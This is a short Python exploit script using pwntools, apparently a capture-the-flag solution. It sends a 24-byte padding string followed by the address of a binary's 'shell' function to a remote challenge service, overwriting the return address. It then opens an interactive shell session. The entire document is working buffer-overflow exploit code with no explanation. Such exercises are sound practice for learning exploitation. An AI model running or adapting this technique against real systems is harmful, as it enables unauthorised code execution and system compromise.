from pwn import *
elf=ELF("./ret")
# elf=process("./ret")
conn=remote("10.131.1.19",60001)
conn.sendline("a"*(16+8)+p64(elf.symbols["shell"]))
conn.interactive()
